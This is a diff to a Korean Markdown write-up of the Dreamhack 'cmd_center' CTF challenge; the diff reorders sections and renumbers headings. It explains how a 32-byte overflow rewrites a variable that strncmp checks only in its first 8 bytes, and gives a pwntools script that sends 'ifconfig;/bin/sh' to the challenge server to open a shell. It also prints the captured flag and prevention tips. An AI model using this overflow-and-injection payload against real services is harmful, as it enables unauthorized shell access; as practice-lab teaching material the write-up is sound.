@@ -43,7 +43,41 @@ int main()
 
 이후 `strncmp(cmd_ip, "ifconfig", 8)`은 문자열 전체가 아니라 처음 8바이트만 비교합니다. 처음 8바이트가 `ifconfig`이면 비교 결과가 0이고, `!0`은 참이므로 `system(cmd_ip)`가 실행됩니다. `system`은 명령을 셸에서 실행하므로 문자열 뒤에 `;/bin/sh`를 붙이면 `ifconfig` 실행 뒤에 셸도 실행됩니다.
 
-### 2. 디스어셈블리에서 변수 주소 찾기
+### 2. 익스플로잇 코드
+
+<p align="center">
+  <img src="assets/cmd_center/solver.png" width="700" alt="원격 서버에 연결하고 오버플로 페이로드를 전송하는 pwntools 코드" />
+</p>
+
+```python
+from pwn import *
+
+# p = process("./cmd_center")  # 로컬 바이너리 실행
+p = remote("host3.dreamhack.games", 19595)
+
+payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"
+
+p.send(payload)
+p.interactive()
+```
+
+### 3. 코드 설명 — payload 구성
+
+`remote(host, port)`는 문제 서버에 연결합니다. `process("./cmd_center")`는 같은 바이너리를 로컬에서 실행할 때 사용하는 코드입니다. `p.send(payload)`는 구성한 바이트를 서버로 보내고, `p.interactive()`는 이후 터미널의 입력과 출력을 원격 연결에 이어 줍니다.
+
+페이로드의 각 부분은 다음 역할을 합니다.
+
+- `b"A" * 0x20`은 32바이트 패딩입니다. `center_name`과 그 뒤 공간을 채워 `cmd_ip` 시작점에 도달합니다.
+- `b"ifconfig"`는 `strncmp`의 8바이트 검사를 통과시키는 접두어입니다.
+- `b";/bin/sh"`는 셸 명령 구분자 `;` 뒤에 셸을 실행합니다.
+
+`read()`는 문자열 끝의 널 문자(`\0`)를 자동으로 붙이지 않습니다. 이 페이로드는 `cmd_ip`의 앞 16바이트만 바꾸며, 선언 때 0으로 초기화된 그 다음 바이트가 문자열의 끝을 표시합니다.
+
+전체 흐름은 `입력 수신 → 32바이트 패딩으로 cmd_ip에 도달 → cmd_ip를 ifconfig;/bin/sh로 변경 → 앞 8바이트 비교 통과 → system이 셸 명령 실행 → 대화형 셸 사용`입니다.
+
+직접 입력해도 원리는 같지만, 패딩을 정확히 32바이트 맞춰야 합니다. 스크립트는 이 길이와 바이트를 정확하게 보내기 위해 사용했습니다. 이 코드에는 제한 시간 기능이 없으므로 시간 압박 때문에 스크립트가 필요한 문제는 아닙니다.
+
+### 4. 32바이트 오프셋은 어디서 나왔나 — 디스어셈블리로 변수 주소 찾기
 
 <p align="center">
   <img src="assets/cmd_center/disassembly.png" width="700" alt="gdb에서 main을 디스어셈블한 화면. 스택 프레임, 카나리, ifconfig 초기화 주소가 보인다." />
@@ -56,8 +90,6 @@ int main()
 | `read(0, center_name, 100)` | `0`: 표준 입력 | `&center_name`: `[rbp-0x130]`를 가리키는 주소 | `100` |
 | `strncmp(cmd_ip, "ifconfig", 8)` | `&cmd_ip`: `[rbp-0x110]`를 가리키는 주소 | `"ifconfig"`의 주소 | `8` |
 
-
-
 read 호출 직전의 명령을 GDB의 AT&T 문법으로 보면 다음과 같습니다.
 
 ```asm
@@ -68,7 +100,7 @@ mov $0x0, %edi          # 첫 번째 인자: 표준 입력
 call read@plt
 ```
 
-이렇게 C 함수 인자 순서와 레지스터를 맞춰 보면, ``read``의 두 번째 인자인 ``center_name``이 ``RSI``에 들어간 주소로 전달되는 것을 확인할 수 있습니다.
+이렇게 C 함수 인자 순서와 레지스터를 맞춰 보면, `read`의 두 번째 인자인 `center_name`이 `RSI`에 들어간 주소로 전달되는 것을 확인할 수 있습니다.
 
 예를 들어 C의 두 번째 인자는 `read(0, center_name, 100)`에서 `center_name`입니다. 어셈블리에서 `RSI`에 `rbp-0x130` 주소가 전달되면, **그 주소가 `center_name`의 시작을 가리킨다**고 읽으면 됩니다. `lea`는 그 위치의 값을 가져오는 것이 아니라 주소를 계산합니다.
 
@@ -93,39 +125,7 @@ cmd_ip 시작 - center_name 시작
 
 `read`가 최대 100바이트를 모두 받는 경우에는 `cmd_ip`의 앞부분 최대 68바이트까지 덮을 수 있습니다(100 - 32). 이번 페이로드는 총 48바이트이므로 `cmd_ip`에는 뒤의 명령 문자열 16바이트가 기록됩니다. 이 입력은 반환 주소나 카나리까지 도달하지 않습니다. 화면에 보이는 카나리는 다른 종류의 스택 변조를 막는 보호 장치이며, 이 풀이의 핵심은 반환 주소를 바꾸는 것이 아니라 `cmd_ip`를 바꾸는 것입니다.
 
-### 3. 페이로드 전송
-
-<p align="center">
-  <img src="assets/cmd_center/solver.png" width="700" alt="원격 서버에 연결하고 오버플로 페이로드를 전송하는 pwntools 코드" />
-</p>
-
-```python
-from pwn import *
-
-# p = process("./cmd_center")  # 로컬 바이너리 실행
-p = remote("host3.dreamhack.games", 19595)
-
-payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"
-
-p.send(payload)
-p.interactive()
-```
-
-`remote(host, port)`는 문제 서버에 연결합니다. `process("./cmd_center")`는 같은 바이너리를 로컬에서 실행할 때 사용하는 코드입니다. `p.send(payload)`는 구성한 바이트를 서버로 보내고, `p.interactive()`는 이후 터미널의 입력과 출력을 원격 연결에 이어 줍니다.
-
-페이로드의 각 부분은 다음 역할을 합니다.
-
-- `b"A" * 0x20`은 32바이트 패딩입니다. `center_name`과 그 뒤 공간을 채워 `cmd_ip` 시작점에 도달합니다.
-- `b"ifconfig"`는 `strncmp`의 8바이트 검사를 통과시키는 접두어입니다.
-- `b";/bin/sh"`는 셸 명령 구분자 `;` 뒤에 셸을 실행합니다.
-
-`read()`는 문자열 끝의 널 문자(`\0`)를 자동으로 붙이지 않습니다. 이 페이로드는 `cmd_ip`의 앞 16바이트만 바꾸며, 선언 때 0으로 초기화된 그 다음 바이트가 문자열의 끝을 표시합니다.
-
-전체 흐름은 `입력 수신 → 32바이트 패딩으로 cmd_ip에 도달 → cmd_ip를 ifconfig;/bin/sh로 변경 → 앞 8바이트 비교 통과 → system이 셸 명령 실행 → 대화형 셸 사용`입니다.
-
-직접 입력해도 원리는 같지만, 패딩을 정확히 32바이트 맞춰야 합니다. 스크립트는 이 길이와 바이트를 정확하게 보내기 위해 사용했습니다. 이 코드에는 제한 시간 기능이 없으므로 시간 압박 때문에 스크립트가 필요한 문제는 아닙니다.
-
-### 4. 셸 진입 확인
+### 5. 셸 진입 확인
 
 <p align="center">
   <img src="assets/cmd_center/interactive.png" width="700" alt="원격 서비스의 Center name 안내 뒤에 셸 프롬프트가 열린 화면" />
@@ -133,7 +133,7 @@ p.interactive()
 
 `$` 프롬프트가 나타나면 원격 셸에서 명령을 입력할 수 있습니다. `Center name: ` 뒤에 프롬프트가 붙어 보이는 것은 원래 안내 문구에 줄바꿈이 없기 때문입니다. 셸 진입 뒤 `cat flag`를 입력해 FLAG 파일을 출력했습니다.
 
-### 5. FLAG 확인 및 제출
+### 6. FLAG 확인 및 제출
 
 <p align="center">
   <img src="assets/cmd_center/flag.png" width="700" alt="원격 셸에서 cat flag를 실행해 FLAG를 출력한 화면" />
@@ -145,7 +145,7 @@ p.interactive()
 DH{f4c11bf9ea5a1df24175eed11da0d16}
 ```
 
-### 6. 취약점 예방법
+### 7. 취약점 예방법
 
 입력 길이를 실제 배열 크기 이하로 제한해야 합니다. 문자열로 사용할 경우 읽은 바이트 수를 확인하고 널 종료도 처리합니다.
 
